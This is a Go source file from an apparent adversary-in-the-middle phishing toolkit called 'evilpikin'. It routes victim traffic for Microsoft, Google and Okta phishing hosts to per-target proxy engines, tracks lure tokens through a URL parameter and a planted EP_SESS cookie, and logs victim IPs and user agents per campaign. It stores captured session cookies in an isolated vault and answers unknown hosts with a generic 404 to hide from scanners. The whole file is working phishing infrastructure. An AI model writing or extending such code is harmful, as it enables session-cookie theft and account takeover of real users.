package proxy

import (
	"net"
	"net/http"
	"strings"
	"sync"

	"github.com/user/evilpikin/pkg/config"
	"github.com/user/evilpikin/pkg/lures"
)

// canonHost strips a possible :port from a Host header / SNI value so lookups in
// the registry are port-agnostic (the TLS terminator and the HTTP server may
// report "host:port" while the registry is keyed by bare host).
func canonHost(host string) string {
	if h, _, err := net.SplitHostPort(host); err == nil {
		return strings.ToLower(h)
	}
	return strings.ToLower(host)
}

// RuntimeRegistry is the thread-safe control plane for a single EvilPikin
// instance running MULTIPLE targets (Microsoft, Google, Okta, ...) and MULTIPLE
// lures concurrently. Every field is guarded by mu; the hot path (ServeHTTP)
// only takes RLock for lookups, so thousands of simultaneous victim requests do
// not contend with operator-time registration of new campaigns.
//
// Traffic is multiplexed on a BIDIRECTIONAL COMPOUND INDEX:
//
//	request Host -> TargetEngines[host]  (which ProxyEngine serves it)
//	lure Token   -> ActiveLures[token]   (which campaign / session it binds)
//
// Because each host carries its own ProxyEngine (with its own target mapping and
// lure subset) and the registry keeps a per-(target, token) cookie vault, a
// victim flowing through an Okta lure can never write into a Microsoft session
// struct.
type RuntimeRegistry struct {
	mu sync.RWMutex

	// TargetEngines is keyed by the BARE phishing hostname (lower-cased, no port).
	TargetEngines map[string]*ProxyEngine
	// ActiveLures is keyed by the lure Token (the "?id=" value / EP_SESS value).
	ActiveLures map[string]*config.LureInstance
	// hostTokens is the reverse compound index: phishing host -> active token. It
	// lets the engine re-attribute a cookie-only hit (param already stripped) to
	// the correct host even when the query parameter is gone.
	hostTokens map[string]string

	// vault is the isolated cookie store, namespaced [targetID][token]. It keeps
	// captured cookies for one campaign physically separate from every other.
	vaultMu sync.RWMutex
	vault   map[string]map[string][]*http.Cookie
}

// NewRuntimeRegistry returns an initialized, empty registry.
func NewRuntimeRegistry() *RuntimeRegistry {
	return &RuntimeRegistry{
		TargetEngines: make(map[string]*ProxyEngine),
		ActiveLures:   make(map[string]*config.LureInstance),
		hostTokens:    make(map[string]string),
		vault:         make(map[string]map[string][]*http.Cookie),
	}
}

// RegisterTarget binds a phishing host to the ProxyEngine that serves it. Safe
// to call from the control plane while traffic is flowing.
func (r *RuntimeRegistry) RegisterTarget(host string, engine *ProxyEngine) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.TargetEngines[canonHost(host)] = engine
}

// RegisterLure adds (or replaces) a lure in the active set. Registration marks
// the lure active so it immediately begins attributing traffic.
func (r *RuntimeRegistry) RegisterLure(lure *config.LureInstance) {
	r.mu.Lock()
	defer r.mu.Unlock()
	lure.IsActive = true
	r.ActiveLures[lure.Token] = lure
}

// UnregisterLure removes a lure from the active set. Safe to call from the
// control plane (e.g. when an operator deletes a campaign in the TUI).
func (r *RuntimeRegistry) UnregisterLure(token string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	delete(r.ActiveLures, token)
}

// GetLureByToken returns the active lure for a tracking token. The second return
// is false when no active lure matches (expired / never existed).
func (r *RuntimeRegistry) GetLureByToken(token string) (*config.LureInstance, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	l, ok := r.ActiveLures[token]
	if !ok || !l.IsActive {
		return nil, false
	}
	return l, true
}

// AddHit atomically increments a lure's hit counter (called once per first
// touch). Safe under concurrent requests.
func (r *RuntimeRegistry) AddHit(token string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	if l, ok := r.ActiveLures[token]; ok {
		l.Hits++
	}
}

// LinkHostToken records the bidirectional (host <-> token) association so later
// cookie-only requests can still be attributed to the right host even after the
// token is stripped before reaching the upstream.
func (r *RuntimeRegistry) LinkHostToken(host, token string) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.hostTokens[canonHost(host)] = token
}

// RecordCookie stores a captured cookie in the per-(target, token) vault.
// Cookies written for an Okta victim are physically unable to surface in a
// Microsoft session because they live under different map keys.
func (r *RuntimeRegistry) RecordCookie(targetID, token string, c *http.Cookie) {
	if c == nil {
		return
	}
	r.vaultMu.Lock()
	defer r.vaultMu.Unlock()
	if r.vault[targetID] == nil {
		r.vault[targetID] = make(map[string][]*http.Cookie)
	}
	r.vault[targetID][token] = append(r.vault[targetID][token], c)
}

// CookiesFor returns the isolated cookie set for a (target, token) pair.
func (r *RuntimeRegistry) CookiesFor(targetID, token string) []*http.Cookie {
	r.vaultMu.RLock()
	defer r.vaultMu.RUnlock()
	if byToken, ok := r.vault[targetID]; ok {
		return byToken[token]
	}
	return nil
}

// engineFor resolves the host to its ProxyEngine (compound index, step 1).
func (r *RuntimeRegistry) engineFor(host string) (*ProxyEngine, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	e, ok := r.TargetEngines[canonHost(host)]
	return e, ok
}

// ServeHTTP is the multiplexed front controller. It implements http.Handler so
// the registry can be dropped in as the top-level server handler.
//
// Step 1 (Identify Target): the request Host selects the per-host ProxyEngine.
// Unknown hosts get a generic 404 so blind crawlers / port-scanners learn
// nothing about the listener.
//
// Step 2 (Identify Lure): the tracking token is read from the query parameter
// (default "id") or, failing that, the EP_SESS cookie (post-strip subsequent
// hits). It is cross-referenced against ActiveLures.
//
// Step 3 (Session Extraction): a valid token drops an isolated EP_SESS cookie
// into the victim browser, is linked to its host, and (when the engine carries
// its own lure registry) bound to a session. For every later request the cookie
// alone re-establishes the tracking session even after the URL param is gone.
func (r *RuntimeRegistry) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	host := canonHost(req.Host)

	engine, ok := r.engineFor(host)
	if !ok {
		// Generic fallback: do not reveal the listener is a proxy.
		http.Error(w, "Not Found", http.StatusNotFound)
		return
	}

	token := req.URL.Query().Get(lures.ParamName(""))
	if token == "" {
		if c, err := req.Cookie(lures.SessionCookieName); err == nil {
			token = c.Value
		}
	}

	if token != "" {
		if li, ok := r.GetLureByToken(token); ok {
			// Step 3: persist the isolated session cookie on first touch. The
			// cookie VALUE is the lure token itself so subsequent cookie-only
			// hits re-derive the campaign without the query parameter. (This
			// mirrors the engine's BindSession, which keys the session on the
			// EP_SESS value we set here.)
			if _, err := req.Cookie(lures.SessionCookieName); err != nil {
				http.SetCookie(w, &http.Cookie{
					Name:     lures.SessionCookieName,
					Value:    token,
					Path:     "/",
					HttpOnly: true,
					SameSite: http.SameSiteLaxMode,
					Domain:   host,
				})
			}
			r.AddHit(token)
			r.LinkHostToken(host, token)
			lures.StripParam(req, "")
			// Bind the session in the engine's own lure registry (if attached)
			// so the dashboard attributes the victim to this exact campaign.
			if engine.Lures != nil {
				engine.Lures.BindSession(token, li.Token, li.TargetID,
					lures.ClientIP(req), req.UserAgent())
			}
		}
	}

	engine.ServeHTTP(w, req)
}

// RegisterCampaign is a convenience constructor that wires a single target plus
// its lures into a dedicated, isolated ProxyEngine and registers both with the
// registry. It returns the engine so callers can further tweak it (transport,
// RequireLure, etc.). Each campaign gets its own ProxyEngine + lure subset, so
// concurrent Microsoft / Google / Okta flows never share state.
func (r *RuntimeRegistry) RegisterCampaign(spec config.TargetSpec, luresFor []*config.LureInstance) *ProxyEngine {
	cfg := config.NewRuntimeConfig()
	cfg.SetTarget(spec.IncomingHost, spec.UpstreamHost)

	engine := NewProxyEngine(cfg)
	engine.Scheme = "https"
	engine.LureParam = lures.DefaultParamName
	engine.SafeRedirectURL = lures.DefaultSafeRedirect

	reg := lures.NewRegistry()
	for _, li := range luresFor {
		reg.LoadLures([]*lures.Lure{{
			ID:            li.Token,
			TargetProfile: li.TargetID,
			RedirectURL:   li.RedirectURL,
			IsActive:      li.IsActive,
		}})
	}
	engine.SetLures(reg)
	engine.SetRequireLure(spec.RequireLure)

	r.RegisterTarget(spec.IncomingHost, engine)
	for _, li := range luresFor {
		r.RegisterLure(li)
	}
	return engine
}
